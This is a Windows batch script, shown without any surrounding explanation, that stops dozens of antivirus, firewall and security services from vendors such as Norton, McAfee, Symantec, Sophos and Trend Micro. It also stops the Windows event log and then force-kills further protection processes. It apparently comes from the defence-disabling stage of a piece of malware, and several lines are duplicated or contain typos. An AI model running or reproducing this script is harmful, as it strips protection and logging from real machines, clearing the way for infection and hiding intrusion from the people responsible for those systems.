   @echo off
   net stop "RsRavMon" /y
   net stop "network associates mcshield" /y
   net stop "network associates task manager" /y
   net stop "mcafee Framework service"
   net stop "RsCCenter" /y
   net stop "Norton AntiVirus Server" /y
   net stop "Norton AntiVirus" /y
   net stop "Serv-U" /y
   net stop "Norton AntiVirus Auto Protect Service" /y
   net stop "Norton AntiVirus Client" /y
   net stop "Symantec AntiVirus Client" /y
   net stop "Norton AntiVirus Server" /y
   net stop "NAV Alert" /y
   net stop "Nav Auto-Protect" /y
   net stop "McShield" /y
   net stop "DefWatch" /y
   net stop "eventlog" /y
   net stop "TCP/IP NetBIOS Helper Service" /y
   net stop "WMDM PMSP Service" /y
   net stop "lmhosts" /y
   net stop "eventlog" /y
   net stop "InoRPC" /y
   net stop "InoRT" /y
   net stop "InoTask" /y
   net stop "IREIKE" /y
   net stop "IPSECMON" /y
   net stop "GhostStartService" /y
   net stop "SharedAccess" /y
   net stop "NAVAPSVC" /y
   net stop "NISUM" /y
   net stop "SymProxySvc" /y
   net stop "NISSERV" /y
   net stop "ntrtscan" /y
   net stop "tmlisten" /y
   net stop "PccPfw" /y
   net stop "tmproxy" /y
   net stop "Tmntsrv" /y
   net stop "PCCPFW" /y
   net stop "AvSynMgr" /y
   net stop "McAfeeFramework" /y
   net stop "Micorsoft Network Firewall Service" /y
   net stop "AvgServ" /y
   net stop "MonSvcNT" /y
   net stop "V3MonNT" /y
   net stop "V3MonSvc" /y
   net stop "spidernt" /y
   net stop "MCVSrte" /y
   net stop "SweepNet" /y
   net stop "SWEEPSRV.SYS" /y
   net stop "KVSrvXP" /y
   net stop "Norton AntiVirus Auto Protect Service"
   net stop "Norton AntiVirus Client"
   net stop "Symantec AntiVirus Client"
   net stop "Norton AntiVirus Server"
   net stop "NAV Alert"
   net stop "Nav Auto-Protect"
   net stop "McShield"
   net stop "DefWatch"
   net stop "SyGateService"
   net stop "Sygate Personal Firewall Pro"
   net stop "Sophos Anti-Virus"
   net stop "Sophos Anti-Virus Network"
   net stop "eTrust Antivirus Job Server"
   net stop "eTrust Antivirus Realtime Server"
   net stop "eTrust Antivirus RPC Server"
   net stop "ose" /y


   %windir\system32\kill.exe AhnSDsv
   %windir\system32\kill.exe ircproxyc
   %windir\system32\kill.exe CPQNIMGT
   %windir\system32\kill.exe llssrv
   %windir\system32\kill.exe svdhost
   %windir\system32\kill.exe CPQTEAM
   %windir\system32\kill.exe netpia
   %windir\system32\kill.exe loadqm
   %windir\system32\kill.exe MonSvcNT
   %windir\system32\kill.exe AhnSD
   %windir\system32\kill.exe Firedaemon
   %windir\system32\kill.exe Firedaemon
   %windir\system32\kill.exe Firedaemon
   %windir\system32\kill.exe zlclient
   %windir\system32\kill.exe kav.exe
   %windir\system32\kill.exe Surveyor
   %windir\system32\kill.exe MonSysNT
   %windir\system32\kill.exe dllhost
   %windir\system32\kill.exe mdm
   %windir\system32\kill.exe cqmgstor
   %windir\system32\kill.exe CpqRcmc
   %windir\system32\kill.exe CQMGHOST
   %windir\system32\kill.exe jushed
   %windir\system32\kill.exe NPROTECT
   %windir\system32\kill.exe FXSSVC
